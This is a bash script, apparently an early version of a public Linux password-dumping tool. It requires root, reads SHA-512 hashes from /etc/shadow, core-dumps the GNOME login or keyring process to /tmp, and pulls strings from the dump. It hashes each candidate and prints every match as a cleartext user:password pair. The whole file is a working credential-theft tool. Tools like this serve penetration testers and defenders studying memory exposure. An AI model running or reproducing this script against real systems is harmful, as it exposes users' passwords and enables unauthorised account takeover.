#!/bin/bash

# Author: Hunter Gregal
# Github: /huntergregal
# Contribution from pugilist - PID extraction method 
# Dumps cleartext credentials from memory

#root check
if [[ $EUID -ne 0 ]]; then
	echo "Root required - You are dumping memory..."
	echo "Even mimikatz requires administrator"
	exit 1
fi

#Get shadow hash
SHADOWHASHES="$(cat /etc/shadow | cut -d':' -f 2 | egrep '^\$6\$')"

#If Kali
if [[ `uname -a | awk '{print tolower($0)}'` == *"kali"* ]]; then
	#get gdm-session-worker [pam/gdm-password] process
	PID="$(ps -eo pid,command | sed -rn '/gdm-password\]/p' | awk 'BEGIN {FS = " " } ; { print $1 }')"
	gcore -o /tmp/dump $PID >& /dev/null
	HASH="$(strings "/tmp/dump.${PID}" | egrep -m 1 '^\$.\$.+$')"
	SALT="$(echo $HASH | cut -d'$' -f 3)"
	DUMP="$(strings "/tmp/dump.${PID}" | egrep '^_pammodutil_getpwnam_root_1$' -B 5 -A 5)"
	DUMP="${DUMP}$(strings "/tmp/dump.${PID}" | egrep '^gkr_system_authtok$' -B 5 -A 5)"
fi

#If Ubuntu
if [[ `uname -a | awk '{print tolower($0)}'` == *"ubuntu"* ]]; then
	#get /usr/bin/gnome-keyring-daemon process
	PID="$(ps -eo pid,command | sed -rn '/gnome\-keyring\-daemon/p' | awk 'BEGIN {FS = " " } ; { print $1 }')"
	gcore -o /tmp/dump $PID >& /dev/null
	HASH="$(strings "/tmp/dump.${PID}" | egrep -m 1 '^\$.\$.+$')"
	SALT="$(echo $HASH | cut -d'$' -f 3)"
	DUMP=$(strings "/tmp/dump.${PID}" | egrep '^.+libgck\-1\.so\.0$' -B 10 -A 10)
fi

#If hash in dump, print it
if [[ ! $HASH ]]; then
	#Else Get shadow hashes
	SHADOWHASHES="$(cat /etc/shadow | cut -d':' -f 2 | egrep '^\$6\$')"
fi

#Determine password potential for each word
while read -r line; do
	#If hash in dump, prepare crypt line
	if [[ $HASH ]]; then
		CRYPT="\"$line\", \"\$6\$$SALT\""
		if [[ `python -c "import crypt; print crypt.crypt($CRYPT)"` == $HASH ]]; then
			#Find which user's password it is (useful if used more than once!)
			USER="$(cat /etc/shadow | grep ${HASH} | cut -d':' -f 1)"
			echo "$USER:$line"
		fi
	#Else use shadow hashes
	elif [[ $SHADOWHASHES ]]; then
		while read -r thishash; do
			SHADOWSALT="$(echo $thishash | cut -d'$' -f 3)"
			CRYPT="\"$line\", \"\$6\$$SHADOWSALT\""
			if [[ `python -c "import crypt; print crypt.crypt($CRYPT)"` == $thishash ]]; then
				#Find which user's password it is (useful if used more than once!)
				USER="$(cat /etc/shadow | grep ${thishash} | cut -d':' -f 1)"
				echo "$USER:$line"
			fi
		done <<< "$SHADOWHASHES"
	else
		echo "Password not found - is this system using sha256 hashes? (\$6\$)"
	fi
done <<< "$DUMP"

#Cleanup
rm -rf "/tmp/dump.${PID}"
